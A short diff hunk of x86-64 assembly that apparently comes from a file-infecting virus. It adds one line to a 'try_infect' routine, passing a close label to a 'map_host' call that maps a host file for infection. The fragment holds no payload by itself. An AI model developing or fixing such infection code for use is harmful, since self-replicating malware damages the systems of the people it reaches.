@@ -290,6 +290,7 @@ try_infect:
     jl .close
 
     mov rdi, rsi
+    mov rsi, .close
     call map_host
     mov data(host_bytes), rax
     mov rdi, rax
